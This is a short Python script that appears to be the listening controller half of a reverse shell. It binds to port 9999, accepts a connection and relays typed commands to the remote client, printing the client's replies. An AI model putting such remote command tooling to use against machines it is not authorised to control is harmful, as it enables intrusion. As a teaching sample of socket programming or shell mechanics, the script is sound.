import socket
import sys


# Creating a socket for connecting two computers.
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as sem:
        print("Socket could not be created. Error Message: {}".format(sem))


# Binding the socket and listening for incoming connections.
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port {}".format(str(port)))

        s.bind((host, port))
        s.listen(5)

    except socket.error as sem:
        print("Socket could not be binded. Error Message: {}".format(sem))
        bind_socket()


# Establishing connection with a client.
def socket_accept():
    conn, address = s.accept()
    print(
        "Connection has been established! {}:{}".format(
            str(address[0]), str(address[1])
        )
    )
    send_commands(conn)
    conn.close()


# Send commands to client.
def send_commands(conn):
    init = True
    while True:
        if init:
            initial_response = str(conn.recv(1024), "utf-8")
            print(initial_response, end="")
            init = False

        cmd = input()

        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
